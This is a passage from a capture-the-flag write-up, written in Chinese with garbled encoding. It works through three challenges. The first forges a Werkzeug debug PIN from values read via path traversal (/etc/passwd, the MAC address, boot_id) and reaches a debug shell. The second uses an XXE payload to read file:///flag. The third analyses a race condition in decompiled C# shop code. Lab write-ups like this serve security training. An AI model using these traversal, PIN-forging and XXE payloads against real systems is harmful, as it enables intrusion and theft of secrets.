h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
          <span class="token keyword">break</span>
       <span class="token keyword">else</span><span class="token punctuation">:</span>
          rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>

<h3 id="2-3-Python-3-8-sha1-Pinè®¡ç®—ä»£ç "><a href="#2-3-Python-3-8-sha1-Pinè®¡ç®—ä»£ç " class="headerlink" title="2.3 Python >= 3.8 sha1 Pinè®¡ç®—ä»£ç "></a>2.3 Python &gt;= 3.8 sha1 Pinè®¡ç®—ä»£ç </h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment">#username</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment">#modname</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span> <span class="token comment">#appname</span>
    <span class="token string">'/usr/local/lib/python3.11/site-packages/flask/app.py'</span> <span class="token comment">#moddir</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485376910315'</span><span class="token punctuation">,</span> <span class="token comment">#uuidnode</span>
    <span class="token string">'3c253d1e-8856-4e45-98b5-e82146c245c5'</span> <span class="token comment">#machine_id</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>
<h3 id="2-4-åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–è·å–ä¿¡æ¯"><a href="#2-4-åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–è·å–ä¿¡æ¯" class="headerlink" title="2.4 åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–è·å–ä¿¡æ¯"></a>2.4 åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–è·å–ä¿¡æ¯</h3><h4 id="2-4-1-è¯»å–-username"><a href="#2-4-1-è¯»å–-username" class="headerlink" title="2.4.1 è¯»å– username"></a>2.4.1 è¯»å– username</h4><p><code>payload</code> å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">/?location=../../../../../../etc/passwd</code></pre>

<p>è¿”å›å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin</code></pre>
<p>åˆ¤æ–­ username <span class="hexo-wm">êœ±â€‹â€‹â‘¶ğ¯ğ˜¦ğ’â€¢â€‹â€‹sï½‰â€‹â€Œğ­eâ€</span>= â€œrootâ€</p>
<h4 id="2-4-2-è¯»å–-moddir"><a href="#2-4-2-è¯»å–-moddir" class="headerlink" title="2.4.2 è¯»å– moddir"></a>2.4.2 è¯»å– moddir</h4><p>éšæœºè¾“å…¥ä¸å­˜åœ¨çš„è·¯å¾„æˆ–è€…å°† <code>?location=</code> å‚æ•°ç½®ç©ºå³å¯<span class="hexo-wm">ğ˜´â€Œ3ğ˜·ğ˜¦n.â€â€Œsğ¢â€Œâ€‹ğ­ğâ€</span>è·å¾—æŠ¥é”™ç•Œé¢å¦‚ä¸‹</p>
<p><img src="image-21.png" alt="image-21.png"></p>
<p>ä»ä¸­å³å¯è·å– moddir = â€œ/usr/local/lib/python3.<span class="hexo-wm">ğ¬â€3ğ’—â„¯ğ˜¯ï¼â€ğ˜´â…ˆâ€‹ğ­eâ€Œâ€</span>11/site-packages/flask/app.pyâ€</p>
<h4 id="2-4-3-è¯»å–-uuidnode"><a href="#2-4-3-è¯»å–-uuidnode" class="headerlink" title="2.4.3 è¯»å– uuidnode"></a>2.4.3 è¯»å– uuidnode</h4><p><code>payload</code> å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">/?location=../../../../../../sys/class/net/eth0/address</code></pre>

<p>è¿”å›å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">02:42:ac:02:04:80</code></pre>
<p>ç»è¿‡ <a href="https://www.toolhelper.cn/Digit/BaseConvert">åœ¨çº¿è¿›åˆ¶è½¬æ¢å·¥å…·</a> å°†16è¿›åˆ¶è½¬1<span class="hexo-wm">sâ€Œï»¿â‘¶vğ˜¦ğ’âˆ™â€Œêœ±ï½‰ï»¿tâ„®â€</span>0è¿›åˆ¶è½¬åŒ–åå¯å¾—<br><img src="image-22.png" alt="image-22.png"></p>
<p>å¾—åˆ° uuidnode = <span class="hexo-wm">ğ¬â€Œâ€3ğ’—â„¯nÂ·â€ğ’”ğ¢â€‹ï½”ï½…â€</span>â€œ2485376910464â€</p>
<h4 id="2-4-4-è¯»å–-machine-id"><a href="#2-4-4-è¯»å–-machine-id" class="headerlink" title="2.4.4 è¯»å– machine_id"></a>2.4.4 è¯»å– machine_id</h4><p>å°è¯•è¯»å–</p>
<pre class="language-none"><code class="language-none">/?location=../../../../../../etc/machine-id</code></pre>
<p>å‘ç°é¡µé¢æŠ›å‡º <code>FileNotFoundError</code> é”™è¯¯</p>
<p>åˆ¤æ–­é¶æœºä¸ºdocker <del>ï¼ˆå…¶å®æœ¬æ¥å°±çŸ¥é“ï¼‰</del></p>
<p>å› æ­¤å°è¯•è¯»å–</p>
<pre class="language-none"><code class="language-none">/?location=../../../../../../proc/sys/kernel/random/boot_id</code></pre>
<p>è¿”å›å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">3c253d1e-8856-4e45-98b5-e82146c245c5</code></pre>
<p>å°è¯•è¯»å–</p>
<pre class="language-none"><code class="language-none">/?location=../../../../../../proc/self/cgroup</code></pre>
<p>è¿”å›å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">0::/</code></pre>
<p>å³ä¸ºç©ºï¼Œæ— ä¿¡æ¯</p>
<p>å› æ­¤å¾—å‡º machine_id = â€œ3c253d1e-8856-<span class="hexo-wm">sâ€‹â‘¶â…´eğ’Â·â€‹â€‹ğ˜´ğ˜ªâ€Œğ˜µâ„®ï»¿</span>4e45-98b5-e82146c245c5â€</p>
<p>æœ€åå°†å¾—åˆ°çš„ä¿¡æ¯å¡«å…¥Pinè®¡ç®—ä»£ç ä¸­å³å¯è·å¾—å½“å‰ç¯å¢ƒçš„Pinç å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">564-346-887</code></pre>

<blockquote>
<p>è¯·æ³¨æ„ï¼šç”±äºDockeræ¯æ¬¡å¯åŠ¨åuuidnodeå€¼ä¼šæ”¹å˜ï¼ŒWrite <span class="hexo-wm">ğ˜´â€â€ğŸ¯â…´eğ˜¯â€¢<span class="hexo-wm">ğ˜€â€ğŸ¯vğ˜¦ğ˜¯.â€Ñ•â…ˆï»¿ï½”ï½…ï»¿</span>ï»¿siâ€‹ï½”â„®â€‹ï»¿</span>Upä¸­çš„Pinå€¼å¯¹è¯¥é¢˜å¹¶ä¸å…·æœ‰æ™®é€‚æ€§ï¼Œè¯·æ ¹æ®å®é™…ç¯å¢ƒè‡ªè¡Œè¯»å–uuidnodeå€¼å¹¶è®¡ç®—ç›¸åº”ç¯å¢ƒçš„Pinç ä½¿ç”¨</p>
</blockquote>
<h3 id="2-5-è·å–-debug-shell"><a href="#2-5-è·å–-debug-shell" class="headerlink" title="2.5 è·å– debug shell"></a>2.5 è·å– debug shell</h3><p>éšæœºè¾“å…¥ä¸å­˜åœ¨çš„è·¯å¾„æˆ–è€…å°† <code>?location=</code> å‚æ•°ç½®ç©ºå³å¯è·å¾—<span class="hexo-wm">ğ’”â€ŒğŸ¯â…´ğ˜¦ğ’â€¤ï»¿â€‹ğ¬ğ¢â€Œğ˜µğâ€Œâ€</span>æŠ¥é”™ç•Œé¢å¦‚ä¸‹</p>
<p><img src="image-23.png" alt="image-23.png"></p>
<p>ç‚¹å‡»å³ä¾§æ§åˆ¶å°å›¾æ ‡å¹¶è¾“å…¥Pinç å³å¯è·å¾— <code>debug shell</code></p>
<p>åœ¨æ§åˆ¶å°è¾“å…¥ <code>os.getenv('FLAG')</code> å³å¯è·å¾—flag</p>
<p><img src="image-24.png" alt="image-24.png"></p>
<p>è·å¾— <code>pin_revenge</code> é¢˜çš„ <code>flag</code> å¦‚ä¸‹:</p>
<pre class="language-none"><code class="language-none">Spirit{badd44f8-94eb-4648-b5d3-cdf837431e52}</code></pre>

<h1 id="ez-xxe"><a href="#ez-xxe" class="headerlink" title="ez_xxe"></a>ez_xxe</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>so easyâ€¦â€¦â€¦</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åæ˜¯ä¸€ä¸ªå¯ä»¥è¾“<span class="hexo-wm">ğ˜´â€ğŸ¯ğ’—ğï½ï¼â€‹ğ˜€â…ˆï»¿ğ­ğ˜¦â€Œâ€</span>å…¥XMLæ–‡æ¡£çš„ç•Œé¢</p>
<p><img src="image-25.png" alt="image-25.png"></p>
<p>å¹¶ä¸”è¾“å…¥åæœ‰å›æ˜¾</p>
<p>ç»“åˆé¢˜ç›®æ ‡é¢˜åˆ¤æ–­æ˜¯åˆ©ç”¨xxeæ¼æ´æ¶<span class="hexo-wm">sï»¿â€Â³â…´ğğ§â€¤â€‹ğ’”ï½‰â€‹â€‹tâ„®ï»¿</span>æ„å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œç›´æ¥è¯»é¶æœºæ–‡ä»¶</p>
<p><code>payload</code> å¦‚ä¸‹</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
&lt;!ENTITY flag SYSTEM "file:///flag" &gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spirit</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>flag</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>flag</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spirit</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>æäº¤å¹¶è¿”å›å¦‚ä¸‹<span class="hexo-wm">sâ€‹3ğ’—ï½…ğ’Â·â€‹êœ±ğ˜ªï»¿â€Œğ­ğ˜¦â€â€</span>ç•Œé¢ï¼Œè·å¾— <code>flag</code> ï¼š<br><img src="image-26.png" alt="image-26.png"></p>
<blockquote>
<p>Spirit{19246b7d-dc61-<span class="hexo-wm">ğ˜€ï»¿â€‹Â³â…´ğ˜¦ğ˜¯ï¼â€<span class="hexo-wm">ğ’”â€Œâ€ŒğŸ¯ğ¯eï½Â·ï»¿â€ğ˜€ğ¢â€ğ’•eâ€‹</span>ï»¿ğ¬ğ¢â€ï½”ğ˜¦ï»¿</span>4829-a4f7-54ffd5d76b01}</p>
</blockquote>
<h1 id="sharpshop"><a href="#sharpshop" class="headerlink" title="sharpshop"></a>sharpshop</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p><img src="image-27.png" alt="image-27.png"></p>
</blockquote>
<blockquote>
<p>Hint: ğŸ¤–</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå‘ç°æ˜¯<del>æ‹¼å¤•å¤•</del>ç ä»·ä¹°flag</p>
<p><img src="image-28.png" alt="image-28.png"></p>
<p>ç»è¿‡ä¸€ä¸ªç®€å•çš„å°è¯•ï¼Œå‘ç° <code>flag</code> çš„ä»·æ ¼æ°¸è¿œç ä¸åˆ°é’±<span class="hexo-wm">êœ±â€ŒğŸ¯ğ’—ï½…ğ˜¯âˆ™â€â€‹ğ˜€â…ˆâ€‹ğ’•eâ€Œ</span>åŒ…ä»·æ ¼åŠä»¥ä¸‹ <del>(å…¸)</del></p>
<p><img src="image-29.png" alt="image-29.png"></p>
<p>ç åˆ°è¿™é‡Œå°±ç ä¸åŠ¨äº† <del>(éœ€è¦10ä¸ªé‡‘å¸å†ç 1åˆ€ï¼Œ<span class="hexo-wm">Ñ•ï»¿â€ğŸ¯ğ’—ğğ’â€¤â€Œğ˜€ğ¢â€‹ï»¿ï½”ğ˜¦ï»¿</span>10ä¸ªç§¯åˆ†æ¢1ä¸ªé‡‘å¸ æ— é™å¾ªç¯Â·Â·Â·)</del></p>
<h2 id="1-åç¼–è¯‘ELF-app"><a href="#1-åç¼–è¯‘ELF-app" class="headerlink" title="1. åç¼–è¯‘ELF-app"></a>1. åç¼–è¯‘ELF-app</h2><p>Hint æç¤ºæˆ‘ä»¬ <code>robots</code> ,å› æ­¤è®¿é—®ç½‘ç«™çš„ <code>robots.txt</code> å¦‚ä¸‹ï¼š</p>
<p><img src="image-30.png" alt="image-30.png"></p>
<p>æ ¹æ®æç¤ºä¸‹è½½ <code>/sharpshop.tar</code></p>
<p>å‘ç°ä¸€ä¸ª <code>ELF</code> ç±»å‹çš„ <code>app</code></p>
<p>åˆæ­¥åˆ¤æ–­æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>c#</code> ç¼–å†™çš„æœåŠ¡ç«¯ç¨‹åº</p>
<p>ï¼ˆæ­¤å¤„ä¹Ÿå¯æ ¹æ®é¢˜ç›®åç§° <code>sharpshop</code> è¿›è¡Œåˆç†çŒœæµ‹ï¼‰</p>
<p>Web çªç„¶å˜ <span class="hexo-wm">Ñ•â€â€‹ğŸ¯vğğ˜¯ï¼â€‹êœ±ğ¢â€Œteâ€</span>Reverse (è¯¯)</p>
<p>ä½¿ç”¨ <code>ILSpy</code> è¿›è¡Œåç¼–è¯‘ï¼Œæå– <code>c#</code> æ–‡ä»¶å†…å®¹</p>
<p><img src="image-31.png" alt="image-31.png"></p>
<p>æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">// sharpshop, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span>
<span class="token comment">// Shopping</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Threading</span><span class="token punctuation">;</span>

<span class="token keyword">internal</span> <span class="token keyword">class</span> <span class="token class-name">Shopping</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">long</span></span> _FlagPrice<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">long</span></span> _Wallet<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> _IsCutting<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> _IsBuying<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">long</span></span> FlagPrice <span class="token operator">=&gt;</span> _FlagPrice<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">long</span></span> Wallet <span class="token operator">=&gt;</span> _Wallet<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> HasFlag <span class="token punctuation">{</span> <span class="token keyword">get</span><span class="token punctuation">;</span> <span class="token keyword">private</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsCutting<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
        _FlagPrice <span class="token operator">-=</span> <span class="token punctuation">(</span>_FlagPrice <span class="token operator">-</span> _Wallet<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsCutting<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">Buy</span><span class="token punctuation">(</span><span class="token keyword">out</span> <span class="token class-name"><span class="token keyword">string</span></span> message<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsBuying<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
        <span class="token class-name"><span class="token keyword">long</span></span> flagPrice <span class="token operator">=</span> _FlagPrice<span class="token punctuation">;</span>
        _Wallet <span class="token operator">-=</span> flagPrice<span class="token punctuation">;</span>
        message <span class="token operator">=</span> <span class="token interpolation-string"><span class="token string">$"è´­ä¹°åä½™é¢ï¼š</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token expression language-csharp">_Wallet</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">bool</span></span> result<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>_Wallet <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            _Wallet <span class="token operator">+=</span> flagPrice<span class="token punctuation">;</span>
            message <span class="token operator">+=</span> <span class="token string">"ï¼Œä½™é¢ä¸è¶³ï½"</span><span class="token punctuation">;</span>
            result <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            message <span class="token operator">+=</span> <span class="token string">"ï¼Œè´­ä¹°æˆåŠŸï½"</span><span class="token punctuation">;</span>
            HasFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            result <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsBuying<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token function">Shopping</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        _IsCutting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        _IsBuying <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        _Wallet <span class="token operator">=</span> <span class="token number">100L</span><span class="token punctuation">;</span>
        _FlagPrice <span class="token operator">=</span> <span class="token keyword">long</span><span class="token punctuation">.</span>MaxValue<span class="token punctuation">;</span>
        HasFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="2-ç«æ€æ¡ä»¶åˆ©ç”¨"><a href="#2-ç«æ€æ¡ä»¶åˆ©ç”¨" class="headerlink" title="2. ç«æ€æ¡ä»¶åˆ©ç”¨"></a>2. ç«æ€æ¡ä»¶åˆ©ç”¨</h2><p>ä»”ç»†è§‚å¯Ÿåå°±ä¼š<span class="hexo-wm">sâ€ğŸ¯ğ’—ï½…ğ§ï¼â€‹â€Ñ•ğ˜ªâ€ğ’•eï»¿â€‹</span>å‘ç°è¯¥ä»£ç çš„åå¸¸ä¹‹å¤„</p>
<p>åœ¨è®¡ç®—ä½™é¢æ˜¯å¦è¶³å¤Ÿè´­ä¹° <code>flag</code> æ—¶</p>
<p>ä»£ç æ²¡æœ‰ç›´æ¥åˆ¤æ–­ <code>_Wallet - flagPrice</code> çš„æ­£è´Ÿ</p>
<p>è€Œæ˜¯å…ˆå°† <code>_Wallet -= flagPrice</code></p>
<p>å¦‚æœä½™é¢ä¸è¶³å† <code>_Wallet += flagPrice</code></p>
<p>è€ƒè™‘åˆ°ä¸¤ä¸ªäº’æ–¥é”ä»…æ§åˆ¶äº†å•<span class="hexo-wm">sâ€3ğ’—â„¯ğ§ï¼â€‹sâ…ˆâ€ğ˜µğ˜¦â€</span>ä¸ªå‡½æ•°ä¸èƒ½è¢«åŒæ—¶å¤šæ¬¡è°ƒç”¨</p>
<p>å¹¶æ²¡æœ‰æ§åˆ¶ä¸¤ä¸ª<span class="hexo-wm">ğ˜´â€‹â€‹Â³â…´enï¼â€ŒÑ•â…ˆâ€‹ï»¿ï½”ï½…â€‹</span>å‡½æ•°çš„åŒæ—¶è¿è¡Œ</p>
<p>ä¸”ç”±äºä¸¤ä¸ªå‡½æ•°éƒ½è®¿é—®äº† <code>_FlagPrice</code> å’Œ <code>_Wallet</code></p>
<p>å› æ­¤å­˜åœ¨ç«æ€æ¡ä»¶çš„å¯èƒ½</p>
<blockquote>
<p>å‡è®¾ action <code>CutDown</code> ä¸­çš„ <code>_FlagPrice -= (_FlagPrice - _Wallet) / 2;</code><br>åœ¨ action <code>Buy</code> çš„ <code>_Wallet -= flagPrice</code> å’Œ <code>_Wallet += flagPrice</code>ä¹‹é—´å‘ç”Ÿï¼Œ<br>å°±å¯ä»¥ä½¿å¾— <code>_FlagPrice</code> é™ä½åˆ° <code>_Wallet</code> ä»¥ä¸‹ï¼Œä»è€Œå¾—ä»¥è´­ä¹° <code>flag</code></p>
</blockquote>
